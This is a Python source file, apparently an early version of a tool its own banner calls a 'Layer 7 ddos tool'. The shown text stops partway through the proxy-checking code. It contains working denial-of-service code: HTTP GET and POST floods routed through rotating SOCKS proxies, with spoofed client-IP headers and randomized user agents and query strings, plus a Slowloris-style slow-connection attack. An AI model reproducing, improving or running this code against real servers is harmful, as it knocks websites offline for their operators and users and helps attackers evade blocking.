#!/usr/bin/python3
#Coded by L330n123
#########################################
# I removed the mixed proxies flood     #
# because in my perspective, it doesn't #
# give more performance when flooding.  #
#                           -- L330n123 #
#########################################
'''
I'm working on Aoyama's update so this project will stop for a while
'''
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import urllib.request


print ('''
       /////    /////    /////////////
      CCCCC/   CCCCC/   | CC-attack |/
     CC/      CC/       |-----------|/ 
     CC/      CC/       |  Layer 7  |/ 
     CC/////  CC/////   | ddos tool |/ 
      CCCCC/   CCCCC/   |___________|/
>--------------------------------------------->
Python3 version 3.0 (Improvement)
                            C0d3d by L330n123
┌─────────────────────────────────────────────┐
│        Tos: Don't attack .gov website       │
├─────────────────────────────────────────────┤
│                 New stuff:                  │
│          + Fast Port Re-use                 │
│          + Added Random client ip           │
│          + Added socks mode selection       │
│          + Fixed slow mode                  │
├─────────────────────────────────────────────┤
│ Link: https://github.com/Leeon123/CC-attack │
└─────────────────────────────────────────────┘''')

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
			"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
			"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
			"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
			"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
			"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
			"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
			"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
			"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
			"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
			"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
			"Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
			"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
			"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
			"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
			"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
			"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
			"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
			"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
			"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
			"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
			"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
			"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
			"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
			"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
			"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
			"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
			"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
			"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
			"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
			"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
			"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
			"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
			"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5",
			"Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
			"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
			"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
			"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
			"Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
			"Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
			"Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
			"Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
			"Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
			"Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
			"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
			"Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",]

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
referers = [
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
]
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
def cc(socks_type):
	connection = "Connection: Keep-Alive\r\n"
	err = 0
	if str(port) == "443" :
		n = "HTTPS"
	else:
		n = "CC"
	while True:
		fake_ip = "X-Forwarded-For: "+str(random.randint(1,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"\r\n"
		fake_ip += "Client-IP: "+str(random.randint(1,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"\r\n"
		accept = random.choice(acceptall)
		referer = "Referer: "+random.choice(referers)+ ip + url2 + "\r\n"
		try:
			proxy = random.choice(proxies).strip().split(":")
			if socks_type == 4:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
			if socks_type == 5:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
			if err > 10:
				print("[!] Target or proxy maybe down| Changing proxy")
				break
			s = socks.socksocket()
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			s.connect((str(ip), int(port)))
			if str(port) == '443':
				s = ssl.wrap_socket(s)
			print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
			try:
				for _ in range(multiple):
					useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
					get_host = "GET " + url2 + "?" + random.choice(strings)+str(random.randint(0,271400281257))+random.choice(strings)+str(random.randint(0,271004281257))+random.choice(strings) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
					request = get_host + referer + useragent + accept + connection + fake_ip+"\r\n"
					s.send(str.encode(request))
				s.close()
			except:
				s.close()
		except:
			s.close()
			err = err +1
	cc(socks_type)

def post(socks_type):
	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
	content = "Content-Type: application/x-www-form-urlencoded\r\n"
	length = "Content-Length: 16 \r\nConnection: Keep-Alive\r\n"
	refer = "Referer: http://"+ ip + url2 + "\r\n"
	user_agent = "User-Agent: " + random.choice(useragents) + "\r\n"
	accept = random.choice(acceptall)
	data = str(random._urandom(16)) # You can enable bring data in HTTP Header
	request = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
	proxy = random.choice(proxies).strip().split(":")
	err = 0
	if str(port) == "443" :
		n = "HTTPS"
	else:
		n = "CC"
	while True:
		try:
			proxy = random.choice(proxies).strip().split(":")
			if socks_type == 4:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
			if socks_type == 5:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
			if err > 10:
				print("[!] Target or proxy maybe down| Changing proxy")
				break
			s = socks.socksocket()
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			s.connect((str(ip), int(port)))
			if str(port) == '443': # //AUTO Enable SSL MODE :)
				s = ssl.wrap_socket(s)
			s.send(str.encode(request))
			print ("[*] "+n+" Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
			try:
				for _ in range(multiple):
					s.send(str.encode(request))
				s.close()
			except:
				s.close()
		except:
			s.close()
			err = err + 1
	post(socks_type)

socket_list=[]
def slow(conn,socks_type):
	proxy = random.choice(proxies).strip().split(":")
	if socks_type == 4:
		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
	if socks_type == 5:
		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
	for _ in range(conn):
		try:
			s = socks.socksocket()
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			s.settimeout(0.6)
			s.connect((str(ip), int(port)))
			if str(port) == '443':
				s = ssl.wrap_socket(s)
			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
			s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
			s.send(("Connection:keep-alive").encode("utf-8"))
			socket_list.append(s)
			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
			sys.stdout.flush()
		except:
			s.close()
			proxy = random.choice(proxies).strip().split(":")#Only change proxy when error, increase the performance
			if socks_type == 4:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
			if socks_type == 5:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
			sys.stdout.flush()
	while True:
		for s in list(socket_list):
			try:
				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
			except:
				s.close()
				socket_list.remove(s)
				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
		proxy = random.choice(proxies).strip().split(":")
		if socks_type == 4:
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
		if socks_type == 5:
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
		for _ in range(conn - len(socket_list)):
			try:
				s.settimeout(1)
				s.connect((str(ip), int(port)))
				if str(port) == '443':
					s = ssl.wrap_socket(s)
				s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
				s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
				s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
				s.send(("Connection:keep-alive").encode("utf-8"))
				socket_list.append(s)
				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
			except:
				proxy = random.choice(proxies).strip().split(":")
				if socks_type == 4:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
				if socks_type == 5:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
				sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
				pass
nums = 0
def checking(lines,socks_type,ms):#Proxy checker coded by Leeon123
	global nums
	global proxies
	proxy = lines.strip().split(":")
	if socks_type == 4:
		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
	if socks_type == 5:
		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
	err = 0
	while True:
		if err == 3:
			proxies.remove(lines)
			break
		try:
			s = socks.socksocket()
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			s.settimeout(ms)#You can change by yourself
			s.connect((str(ip), int(port)))
			if port == 443:
				s = ssl.wrap_socket(s)
			s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
			s.close()
			break
		except:
			err +=1
	nums += 1

def check_socks(ms):#Coded by Leeon123
	global nums
	thread_list=[]
	for lines in list(proxies):
		if choice == "5":
			th = threading.Thread(target=checking,args=(lines,5,ms,))
			th.start()
		if choice == "4":
